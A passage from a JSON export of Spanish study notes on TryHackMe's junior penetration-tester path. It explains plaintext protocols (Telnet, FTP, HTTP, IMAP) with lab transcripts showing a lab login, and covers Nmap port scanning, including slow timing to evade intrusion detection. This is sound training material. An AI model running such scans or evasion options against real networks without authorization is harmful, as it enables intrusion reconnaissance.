not have transferred correctly.\n226 Transfer complete.\n4006 bytes received in 0.000269 secs (14892.19 Kbytes/sec)\nftp> exit\n221 Goodbye.\n```\n\nHay varios software de servidor FTP que puedes seleccionar como:\n\n- [vsftpd](https://security.appspot.com/vsftpd.html)\n- [ProFTPD](http://www.proftpd.org/)\n- [uFTP](https://www.uftpserver.com/)\n\nPara clientes FTP, adem√°s de la consola FTP del cliente normalmente encontrada en sistemas Linux, puedes usar clientes FTP con GUI como [FileZilla](https://filezilla-project.org/). Algunos navegadores web tambi√©n lo soportan.\n\nGracias a que FTP manda las credenciales de login junto con los comandos y archivos en texto plano, el tr√°fico FTP puede ser f√°cil de interceptar para los atacantes.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Telnet",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/7-protocols-and-servers/2-telnet/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/7. Protocols and Servers/2. Telnet.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 7. Protocols and Servers",
    "content": "El protocolo Telnet es un protocolo de nivel de aplicaci√≥n usado para conectarse a una m√°quina virtual u otra m√°quina.\n\nUn servidor de Telnet usa este protocolo para escuchar conexiones entrantes en el puerto 23. Consideremos el ejemplo de abajo. Un usuario se est√° conectando a `telnetd`, un servidor Telnet. Los pasos son los siguientes:\n\n1. Primero se le pide que introduzca su nombre de usuario. √âl escribe `frank`.\n2. Luego, se le pregunta por la contrase√±a, `D2xc9CgD`. La contrase√±a no se muestra en la pantalla.\n3. Una vez que el sistema verifica sus credenciales es recibido con un mensaje de bienvenida.\n4. El servidor remoto le ofrece una command prompt, `frank@bento:4~$`. El `$` indica que no es root.\n\n```shell\npentester@TryHackMe$ telnet 10.80.185.10\nTrying 10.80.185.10...\nConnected to 10.80.185.10.\nEscape character is '^]'.\nUbuntu 20.04.3 LTS\nbento login: frank\nPassword: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-84-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Fri 01 Oct 2021 12:24:56 PM UTC\n\n  System load:  0.05              Processes:              243\n  Usage of /:   45.7% of 6.53GB   Users logged in:        1\n  Memory usage: 15%               IPv4 address for ens33: 10.80.185.10\n  Swap usage:   0%\n\n * Super-optimized for small spaces - read how we shrank the memory\n   footprint of MicroK8s to make it the smallest full K8s around.\n\n   https://ubuntu.com/blog/microk8s-memory-optimisation\n\n0 updates can be applied immediately.\n\n\n*** System restart required ***\nLast login: Fri Oct  1 12:17:25 UTC 2021 from meiyo on pts/3\nYou have mail.\nfrank@bento:~$\n```\n\nAunque Telnet nos dio acceso al sistema remoto, no es un protocolo confiable para administraci√≥n remota ya que toda la informaci√≥n se manda en texto plano. En la imagen de abajo hemos capturado el tr√°fico de inicio de sesi√≥n. El texto en rojo es lo que nosotros mandamos y el azul lo que Telnet nos mand√≥ de vuelta. F√≠jate que el nombre aparece con caracteres repetidos. Eso es porque cuando nosotros escribimos `f`, en la pantalla aparece `f`. Esto es porque nosotros no escribimos en la pantalla sino en el servidor, y es este el que lo manda de vuelta para que lo veamos reflejado en la pantalla. Sin embargo, la contrase√±a no.\n\n![[Pasted image 20251121102626.png]]\n\n>[!TIP] La alternaticva segura a Telnet es SSH.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Protocols and Servers",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/7-protocols-and-servers/0-protocols-and-servers/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/7. Protocols and Servers/0. Protocols and Servers.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 7. Protocols and Servers",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/7. Protocols and Servers/1. Introduction]]\n[[2. Telnet]]\n[[3. Hypertext Transfer Protocol (HTTP)]]\n[[4. File Transfer Protocol (FTP)]]\n[[5. Simple Mail Transfer Protocol (SMTP)]]\n[[6. Post Office Protocol 3 (POP3)]]\n[[7. Internet Message Access Protocol (IMAP)]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/7. Protocols and Servers/8. Summary]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Internet Message Access Protocol (IMAP)",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/7-protocols-and-servers/7-internet-message-access-protocol-imap/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/7. Protocols and Servers/7. Internet Message Access Protocol (IMAP).md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 7. Protocols and Servers",
    "content": "Internet Message Access Protocol (IMAP) es una forma m√°s sofisticada que POP3 para ver los correos ya que permite sincronizar la bandeja de entrada a lo largo de m√∫ltiples dispositivos.\n\nPara iniciar sesi√≥n usamos `LOGIN username password`. IMAP requiere que cada comando vaya precedido de una string random para llevar un control de la respuesta. Por esto hemos a√±adido `c1` y `c2` abajo. Despu√©s listamos los mensajes con `LIST \"\" \"*\"` antes de comprobar los mensajes con `EXAMINE INBOX`. El puerto por defecto de IMAP es el 143.\n\n```shell\npentester@TryHackMe$ telnet 10.80.185.10 143\nTrying 10.80.185.10...\nConnected to 10.80.185.10.\nEscape character is '^]'.\n* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.\nc1 LOGIN frank D2xc9CgD\n* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)\nc1 OK LOGIN Ok.\nc2 LIST \"\" \"*\"\n* LIST (\\HasNoChildren) \".\" \"INBOX.Trash\"\n* LIST (\\HasNoChildren) \".\" \"INBOX.Drafts\"\n* LIST (\\HasNoChildren) \".\" \"INBOX.Templates\"\n* LIST (\\HasNoChildren) \".\" \"INBOX.Sent\"\n* LIST (\\Unmarked \\HasChildren) \".\" \"INBOX\"\nc2 OK LIST completed\nc3 EXAMINE INBOX\n* FLAGS (\\Draft \\Answered \\Flagged \\Deleted \\Seen \\Recent)\n* OK [PERMANENTFLAGS ()] No permanent flags permitted\n* 0 EXISTS\n* 0 RECENT\n* OK [UIDVALIDITY 631694851] Ok\n* OK [MYRIGHTS \"acdilrsw\"] ACL\nc3 OK [READ-ONLY] Ok\nc4 LOGOUT\n* BYE Courier-IMAP server shutting down\nc4 OK LOGOUT completed\nConnection closed by foreign host.\n```\n\nIMAP tambi√©n manda las comunicaciones en texto plano por lo que cualquier persona analizando la red podr√° verlo.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Hypertext Transfer Protocol (HTTP)",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/7-protocols-and-servers/3-hypertext-transfer-protocol-http/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/7. Protocols and Servers/3. Hypertext Transfer Protocol (HTTP).md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 7. Protocols and Servers",
    "content": "HyperText Transfer Protocol (HTTP) es el protocolo usado para transferir p√°ginas web. Tu navegador web se conecta al servidor web y usa HTTP para pedir el HTML de las p√°ginas, im√°genes y m√°s elementos.\n\n![[Pasted image 20251121105109.png]]\n\nHTTP manda y recibe la informaci√≥n en texto plano. Por lo que puedes usar una herramienta como Telnet (o Netcat) para comunicarte con un servidor y actuar como un navegador. La √∫nica diferencia es que necesitas introducir los comandos relacionados a HTTP en lugar de que lo haga el navegador por t√≠.\n\nEn el siguiente ejemplo veremos c√≥mo podemos usar Telnet para simular ser un navegador web y comunicarnos con el servidor.\n\n1. Nos conectamos al puerto 80 (HTTP por defecto) usando `telnet <IP_SERVIDOR> 80`.\n2. Despu√©s, necesitamos escribir `GET /index.html HTTP/1.1` para recibir la p√°gina `index.html` o `GET / HTTP/1.1` para recibir la p√°gina por defecto.\n3. Por √∫ltimo, necesitamos ofrecer alg√∫n valor de host, como `host: telnet` y darle a `Enter` dos veces.\n\n```html\npentester@TryHackMe$ telnet 10.80.185.10 80\nTrying 10.80.185.10...\nConnected to 10.80.185.10.\nEscape character is '^]'.\nGET /index.html HTTP/1.1\nhost: telnet\n\nHTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nDate: Wed, 15 Sep 2021 08:56:20 GMT\nContent-Type: text/html\nContent-Length: 234\nLast-Modified: Wed, 15 Sep 2021 08:53:59 GMT\nConnection: keep-alive\nETag: \"6141b4a7-ea\"\nAccept-Ranges: bytes\n\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <title>Welcome to my Web Server</title>\n  <meta charset=\"UTF-8\" />\n  <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\" />\n</head>\n<body>\n  <h1>Coming Soon<h1>\n</body>\n</html>\n```\n\nSe necesita un cliente HTTP y un servidor HTTP para establecer la conexi√≥n. Algunas opciones populares de servidor son:\n\n- [Apache](https://www.apache.org/)\n- [Internet Information Services (IIS)](https://www.iis.net/)\n- [nginx](https://nginx.org/)\n\nApache y nginx son gratis y de c√≥digo abierto mientras que IIS es propiedad de Microsoft y requiere licencia.\n\nHay muchos navegadores web disponibles. En este momento, los navegadores m√°s populares son:\n\n- Chrome (Google)\n- Edge (Microsoft)\n- FireFox (Mozilla)\n- Safari (Apple)\n\nLos navegadores son gratuitos de usar e instalar.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Fine-Tuning Scope and Performance",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/4-nmap-basic-port-scans/7-fine-tuning-scope-and-performance/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/4. Nmap Basic Port Scans/7. Fine-Tuning Scope and Performance.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 4. Nmap Basic Port Scans",
    "content": "Puedes especificar los puertos que quieres escanear en lugar de quedarte con los 1000 puertos por defecto. Especificar puertos deber√≠a resultarte intuitivo:\n\n- Lista de puertos: `-p22,80,443` escanear√° los puertos 22, 80 y 443.\n- Rango de puertos: `-p1-1023` escanear√° los puertos entre 1 y 1023 ambos incluidos.\n\nPuedes pedir el escaneo de todos los puertos con la opci√≥n `-p-` (no es una errata, gui√≥n delante y detr√°s) para escanear los 65535 puertos. Si quieres escanear los 100 m√°s comunes usa `-F` y si quieres escanear los 10 m√°s comunes usa `--top-ports 10`.\n\nPuedes controlar el timing del escaneo con `-T<0-5>`. Con `0` ser√° el m√°s lento (y menos detectable) mientras que con `5` ser√° el m√°s r√°pido (y agresivo).\n\n- Paranoid (0)\n- Sneaky (Sigiloso; 1)\n- Polite (Educado; 2)\n- Normal (3)\n- Aggressive (4)\n- Insane (5)\n\nPara evitar alertas IDS, puedes considerar usar `-T0` o `-T1`. `-T0` escanea un puerto cada vez y tarda 5 minutos entre uno y otro, as√≠ que ya puedes imaginarte cu√°nto tarda en escanear un objetivo completo. Si no especificas nada, Nmap escanea usando `-T3`.\n\nTambi√©n puedes controlar la frecuencia de mandado de paquetes usando `--min-rate <n√∫mero>` y `--max-rate <n√∫mero>`.\n\nAdem√°s, puedes controlar la cantidad de hilos en paralelo que mandan paquetes con `--min-parallelism <n√∫mero>` y `--max-parallelism <n√∫mero>`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Summary",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/4-nmap-basic-port-scans/8-summary/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/4. Nmap Basic Port Scans/8. Summary.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 4. Nmap Basic Port Scans",
    "content": "En esta unidad hemos cubierto tres tipos de escaneo:\n\n| Tipo de Escaneo de Puertos | Comando de Ejemplo           |\n| -------------------------- | ---------------------------- |\n| TCP Connect Scan           | `nmap -sT 10.82.141.81`      |\n| TCP SYN Scan               | `sudo nmap -sS 10.82.141.81` |\n| UDP Scan                   | `sudo nmap -sU 10.82.141.81` |\nAdem√°s hemos visto las siguientes opciones para refinarlos:\n\n| Opci√≥n                  | Prop√≥sito                                 |\n| ----------------------- | ----------------------------------------- |\n| `-p-`                   | Todos los puertos                         |\n| `-p1-1023`              | Puertos del 1 al 1023                     |\n| `-F`                    | Los 100 puertos m√°s comunes               |\n| `-r`                    | Escanear los puertos en orden consecutivo |\n| `-T<0-5>`               | Rapidez del escaneo                       |\n| `--max-rate 50`         | Cantidad m√°xima de paquetes por segundo   |\n| `--min-rate 15`         | Cantidad m√≠nima de paquetes por segundo   |\n| `--min-parallelism 100` | Cantidad de hilos escaneando              |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. TCP SYN Scan",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/4-nmap-basic-port-scans/5-tcp-syn-scan/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/4. Nmap Basic Port Scans/5. TCP SYN Scan.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 4. Nmap Basic Port Scans",
    "content": "Los usuarios no privilegiados est√°n limitados al escaneo TPC connect. Sin embargo, el modo de escaneo por defecto es SYN scan, el cual requiere privilegios. El escaneo SYN no necesita completar el 3-way handshake TCP. En su lugar, termina la conexi√≥n una vez que recibe una respuesta del servidor. Como no establecemos una conexi√≥n TCP, esto reduce la posibilidad de ser registrado. Podemos seleccionar este escaneo con la opci√≥n `-sS` La figura de abajo muestra c√≥mo el escaneo TCP SYN funciona sin completar el 3-way handshake.\n\n![[Pasted image 20251119153549.png]]\n\nLa siguiente captura de pantalla de Wireshark muestra este tipo de conexi√≥n.\n\n![[Pasted image 20251119153727.png]]\n\nPara entender mejor la diferencia considera la siguiente captura donde la primera mitad est√° hecha usando la opci√≥n `-sT` y la segunda con `-sS`.\n\n![[Pasted image 20251119153825.png]]\n\nEl escaneo TCP SYN es el modo por defecto al usar Nmap como usuario privilegiado y es una opci√≥n bastante confiable. Ha descubierto los mismos puertos que el escaneo anterior, solo que en este caso no ha llegado a establecer ninguna conexi√≥n TCP, por lo que es menos rastreable.\n\n```shell\npentester@TryHackMe$ sudo nmap -sS MACHINE_IP\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-08-30 09:53 BST\nNmap scan report for MACHINE_IP\nHost is up (0.0073s latency).\nNot shown: 994 closed ports\nPORT    STATE SERVICE\n22/tcp  open  ssh\n25/tcp  open  smtp\n80/tcp  open  http\n110/tcp open  pop3\n111/tcp open  rpcbind\n143/tcp open  imap\nMAC Address: 02:45:BF:8A:2D:6B (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.60 seconds\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/4-nmap-basic-port-scans/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/4. Nmap Basic Port Scans/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 4. Nmap Basic Port Scans",
    "content": "Esta es la segunda unidad de una serie de cuatro dedicada a Nmap:\n\n1. [[0. Nmap Live Host Discovery]]\n2. [[0. Nmap Basic Port Scans]]\n3. [[0. Nmap Advanced Port Scans]]\n4. [[0. Nmap Post Port Scans]]\n\nEn la unidad anterior nos enfocamos en descubrir sistemas activos. Hasta ahora hemos cubierto tres pasos del escaneo de Nmap:\n\n1. Enumerar objetivos.\n2. Descubrir hosts activos.\n3. Comprobaci√≥n reverse-DNS\n\n![[Pasted image 20251119104346.png]]\n\nEl siguiente paso ser√≠a comprobar qu√© puertos est√°n abiertos y escuchando y cu√°les est√°n cerrados. Por eso, en esta unidad y la siguiente, nos enfocaremos en escanear puertos y los diferentes tipos de escaneo usados para este prop√≥sito por `nmap`. Esta unidad explica el escaneo de puertos:\n\n1. TCP connect.\n2. TCP SYN.\n3. UDP.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Nmap Basic Port Scans",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/4-nmap-basic-port-scans/0-nmap-basic-port-scans/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/4. Nmap Basic Port Scans/0. Nmap Basic Port Scans.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 4. Nmap Basic Port Scans",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/4. Nmap Basic Port Scans/1. Introduction]]\n[[2. TCP and UDP Ports]]\n[[3. TCP Flags]]\n[[4. TCP Connect Scan]]\n[[5. TCP SYN Scan]]\n[[6. UDP Scan]]\n[[7. Fine-Tuning Scope and Performance]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/4. Nmap Basic Port Scans/8. Summary]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. UDP Scan",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/4-nmap-basic-port-scans/6-udp-scan/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/4. Nmap Basic Port Scans/6. UDP Scan.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 4. Nmap Basic Port Scans",
    "content": "UDP es un protocolo sin conexi√≥n y por lo tanto no requiere de ning√∫n handshake para establecer una conexi√≥n.  No podemos garantizar que el servicio que escucha en un puerto UDP responda a nuestros paquetes. Sin embargo, si se manda un paquete UDP a un puerto cerrado, recibimos un √†quete ICMP error (tipo 3) de vuelta. Para este escaneo usamos la opci√≥n `-sU`. Podemos combinarlo con otros escaneos TCP.\n\nLa siguiente figura muestra que si mandamos un paquete UDP a un puerto abierto, no recibiremos ninguna respuesta.\n\n![[Pasted image 20251120103718.png]]\n\nSin embargo, si lo mandamos a un puerto cerrado recibiremos un ICMP error.\n\n![[Pasted image 20251120103744.png]]\n\nEn la captura de Wireshark de abajo vemos esta interacci√≥n.\n\n![[Pasted image 20251120103903.png]]\n\nAl mandar un escaneo de este tipo contra el mismo servidor prueba ser valioso, pues podemos determinar que el puerto 111 est√° abierto, aunque ahora no puede saber si el puerto 68 est√° abierto.\n\n```shell\npentester@TryHackMe$ sudo nmap -sU 10.82.139.124\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-08-30 09:54 BST\nNmap scan report for 10.82.139.124\nHost is up (0.00061s latency).\nNot shown: 998 closed ports\nPORT    STATE         SERVICE\n68/udp  open|filtered dhcpc\n111/udp open          rpcbind\nMAC Address: 02:45:BF:8A:2D:6B (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1085.05 seconds\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. TCP and UDP Ports",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/4-nmap-basic-port-scans/2-tcp-and-udp-ports/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/4. Nmap Basic Port Scans/2. TCP and UDP Ports.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 4. Nmap Basic Port Scans",
    "content": "De la misma forma que una direcci√≥n IP especifica un host en la red entre otras cosas, un puerto TCP o UDP se usa para identificar un servicio de red corriendo en dicho host. Un servidor ofrece un servicio de red y se adhiere a un protocolo de red espec√≠fico. Ejemplos son ofrecer la hora, responder a queries DNS o servir p√°ginas web. Un puerto est√° normalmente ligado a un servicio que usa ese puerto. Por ejemplo, HTTP est√° ligado al puerto TCP 80 por defecto.\n\n>[!CAUTION] S√≥lo un servicio puede correr en el mismo puerto.\n\nPodemos clasificar los puertos en dos fases:\n\n1. Puertos abiertos indican que alg√∫n servicio est√° escuchando ese puerto.\n2. Puertos cerrados indican que no hay servicios escuchando en ese puerto.\n\nSin embargo, en las situaciones pr√°cticas necesitamos considerar el impacti de los fireewalls. Por ejemplo, un puerto puede estar abierto, pero un firewall bloquear ciertos paquetes. Por lo que Nmap considera las siguientes 6 fases:\n\n1. **Open:** Indica que un servicio est√° escuchando en dicho puerto.\n2. **Closed:** Indica qye ning√∫n servicio est√° escuchando en dicho puerto aunque es accesible (porque no est√° bloqueado por un Firewall).\n3. **Filtered:** Significa que Nmap no puede determinar si est√° abierto o cerrado porque no es accesible. Se debe a que un firewall est√° impidiendo el tr√°fico de paquetes.\n4. **Unfiltered:** Significa que Nmap no puede determinar si est√° abierto o cerrado aunque sea accesible (no hay firewall bloqueando).\n5. **Open|Filtered:** Significa que no sabe si est√° abierto o filtrado.\n6. **Closed|Filtered:** Significa que no sabe si est√° cerrado o filtrado.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. TCP Flags",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/4-nmap-basic-port-scans/3-tcp-flags/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/4. Nmap Basic Port Scans/3. TCP Flags.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 4. Nmap Basic Port Scans",
    "content": "Nmap soporta diferentes tipos de escaneo de puertos TCP. Para entender la diferencia entre estos, necesitamos revisar el header TCP. El headder TCP es el primer segmento TCP de 24 bytes. La imagen de abajo muestra un header TCP, definido en la [RFC 793](https://datatracker.ietf.org/doc/html/rfc793.html).\n\n![[Pasted image 20251119140610.png]]\n\nEn la primera fila, tenemos el puerto TCP fuente y destino. Cada fila tiene 32 bits, con un total de 6 filas, haciendo un total de 192 bits.\n\nEn oarticular, debemos centrarnos en las flags que Nmap puede configurar o desconfgurar. Tenemos flags TCP resaltadas en rojo. Configurar una flag (set) implica asignarle un valor de 1. De izquierda a derecha las flags son:\n\n1. **URG:** Flag urgente que indica que la informaci√≥n a continuaci√≥n es urgente y se procesa sin tener que esperarpaquetes TCP mandados antes.\n2. **ACK:** La flag acknowledge indica que el n√∫mero de reconocimiento es relevante. Se usa para indicar la recepci√≥n de un paquete TCP.\n3. **PSH:** La flag push le pide a TCP que pase la informaci√≥n a la aplicaci√≥n r√°pidamente.\n4. **RST:** La flag reset es usada para terminar una conexi√≥n TCP.\n5. **SYN:** La flag synchronize se usa para iniciar un 3-way hadshake TCP.\n6. **FIN:** El que env√≠a no tiene m√°s informaci√≥n que mandar.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. TCP Connect Scan",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/4-nmap-basic-port-scans/4-tcp-connect-scan/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/4. Nmap Basic Port Scans/4. TCP Connect Scan.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 4. Nmap Basic Port Scans",
    "content": "El escaneo TCP connect funciona completando el 3-way handshake TCP. En una conexi√≥n TCP est√°ndar, el cliente manda un paquete TCP con la flag SYN, el servidor respondo con SYN/ACK si el puerto est√° abiert y el cliente completa el handshake con ACK.\n\n![[Pasted image 20251119143310.png]]\n\nEstamos interesados en saber si el puerto est√° abierto, no en establecer una conexi√≥n, por lo que  la conexi√≥n con este tipo de escaneo se corta con un RST/ACK. Para ello, usa la opci√≥n `-sT`.\n\n![[Pasted image 20251119143424.png]]\n\n>[!IMPORTANT] Si no tienes privilegios, TCP connect es el √∫nico tipo de escaneo que podr√°s hacer para descubrir puertos TCP abiertos.\n\nEn la siguiente captura de Wireshark vemos un escaneo TCP connect.\n\n![[Pasted image 20251119144151.png]]\n\nPodemos ver que el puerto 143 est√° abierto, ya que respondi√≥ con SYN/ACK. A continuaci√≥n vemos c√≥mo Nmap concluy√≥ la conexi√≥n con un ACK y despu√©s la termin√≥ con un RST/ACK. En total hubo un intercambio de 4 paquetes.\n\n![[Pasted image 20251119144328.png]]\n\nPara ilustrar el ejemplo aqu√≠ vemos lo que pasa en la CLI.\n\n```shell\npentester@TryHackMe$ nmap -sT MACHINE_IP\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2021-08-30 09:53 BST\nNmap scan report for MACHINE_IP\nHost is up (0.0024s latency).\nNot shown: 995 closed ports\nPORT    STATE SERVICE\n22/tcp  open  ssh\n25/tcp  open  smtp\n80/tcp  open  http\n111/tcp open  rpcbind\n143/tcp open  imap\n993/tcp open  imaps\n995/tcp open  pop3s\nMAC Address: 02:45:BF:8A:2D:6B (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 0.40 seconds\n```\n\nPodemos incluir la opci√≥n `-F` para ir ma≈õ r√°pido, lo que reducir√° la cantidad de puertos escaneados de los 1000 m√°s comunes a los 100 m√°s comunes. Tambi√©n podemos usar la opci√≥n `-r` para escanear los puertos en orden consecutivo en lugar de orden random.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/9-net-sec-challenge/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/9. Net Sec Challenge/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 9. Net Sec Challenge",
    "content": "Para ver este curso ve a **THM -> Maquinas -> 2. Medium -> 2. Net Sec Challenge**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Net Sec Challenge",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/9-net-sec-challenge/0-net-sec-challenge/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/9. Net Sec Challenge/0. Net Sec Challenge.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 9. Net Sec Challenge",
    "content": "[[Ciberseguridad/THM/Maquinas/2. Medium/2. Net Sec Challenge/0. Net Sec Challenge]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/9. Net Sec Challenge/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/3-nmap-live-host-discovery/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/3. Nmap Live Host Discovery/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 3. Nmap Live Host Discovery",
    "content": "Cuando queremos tomar como objetivo una red, necesitamos una herramienta eficiente para ayudarnos a manejar tareas repetitivas y responder a las siguientes preguntas:\n\n1. ¬øQu√© sistemas est√°n levantados?\n2. ¬øQu√© servicios est√° corriendo en esos sistemas?\n\nLa herramienta en la que confiamos es Nmap. Esta es la primera unidad de una serie de 4 sobre Nmap:\n\n1.  [[0. Nmap Live Host Discovery]]\n2. [[0. Nmap Basic Port Scans]]\n3. [[0. Nmap Advanced Port Scans]]\n4. [[0. Nmap Post Port Scans]]\n\nEn esta en concreto veremos c√≥mo descubrir hosts activos adem√°s de ver los diferentes acercamientos que realiza Nmap con este prop√≥sito:\n\n1. Escaneo ARP\n2. Escaneo ICMP\n3. Escaneo TCP/UDP\n\nNmap es la abreviatura de Network Mapper. El proceso de escaneo suele seguir un proceso detallado abajo:\n\n![[Pasted image 20251117211507.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Nmap Live Host Discovery",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/3-nmap-live-host-discovery/0-nmap-live-host-discovery/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/3. Nmap Live Host Discovery/0. Nmap Live Host Discovery.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 3. Nmap Live Host Discovery",
